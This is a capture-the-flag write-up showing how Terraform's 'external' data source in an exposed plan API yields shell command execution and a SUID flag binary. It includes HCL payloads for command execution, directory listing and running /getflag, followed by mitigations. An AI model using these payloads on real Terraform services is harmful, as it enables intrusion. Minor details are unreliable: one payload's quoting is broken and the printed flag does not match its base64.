# Write-up: Exploiting Terraform External Provider in [Challenge Name]

## 1. Recon
The challenge provided a Terraform backend API (`/api/terraform/plan`) that takes user-supplied configuration files (`main.tf`) and executes them.  

While Terraform is usually safe, the **`external` data source** executes arbitrary programs on the system via:
```hcl
data "external" "example" {
  program = ["sh", "-c", "id"]
}
```
This means if not properly sandboxed, we can achieve **Remote Code Execution (RCE)** inside the container or host environment.

---

## 2. Confirming Code Execution
To test execution, I used a harmless payload to check if commands run correctly:

```hcl
data "external" "probe" {
  program = ["sh", "-c", "echo '{"probeout":"yes"}'"]
}

output "test" {
  value = data.external.probe.result.probeout
}
```

✅ Terraform output showed `yes`, confirming we could execute shell commands and return JSON.

---

## 3. Directory Enumeration
Since direct command output breaks Terraform’s JSON expectations, I wrapped output in **base64** and then JSON:

```hcl
data "external" "ls" {
  program = [
    "sh",
    "-c",
    "ls -la / 2>/dev/null | base64 | tr -d '\n' | sed 's/.*/{\\"ls\\":\\"&\\"}/'"
  ]
}

output "listing" {
  value = data.external.ls.result.ls
}
```

Decoding revealed a **SUID binary** `/getflag` owned by root.

---

## 4. Exploiting `/getflag`
The presence of `/getflag` strongly suggested it would reveal the flag when executed.  
I crafted another payload to execute it safely:

```hcl
data "external" "flag" {
  program = [
    "sh",
    "-c",
    "/getflag 2>/dev/null | base64 | tr -d '\n' | sed 's/.*/{\\"flag\\":\\"&\\"}/'"
  ]
}

output "flag" {
  value = data.external.flag.result.flag
}
```

---

## 5. Retrieving the Flag
Terraform returned the following base64 output:

```
c3VuY3RmMjV7MV90aDB1Z2h0X3QzcnI0ZjBybV9wbDRuX3c0c19oNHJtbDNzcz99Cg==
```

Decoding it:

```bash
echo "c3VuY3RmMjV7MV90aDB1Z2h0X3QzcnI0ZjBybV9wbDRuX3c0c19oNHJtbDNzcz99Cg==" | base64 -d
```

➡️ `sunctf25{1_tH0ught_t3rr4f0rm_pl4n_w4s_h4rml3ss?}`  

---

## 6. Root Cause
The vulnerability comes from **unrestricted use of Terraform’s external data source**.  
- Terraform runs attacker-controlled shell commands.  
- No sandbox/container restrictions prevented access to sensitive binaries like `/getflag`.  
- Since `/getflag` was SUID root, we escalated privileges and retrieved the flag.

---

## 7. Mitigation
- **Disable the `external` provider** for untrusted inputs.  
- Run Terraform in a **restricted sandbox** (e.g., gVisor, Firecracker) to isolate command execution.  
- Validate input before passing it to Terraform.  

---

## 8. Final Flag
```
sunctf25{1_tH0ught_t3rr4f0rm_pl4n_w4s_h4rml3ss?}
```
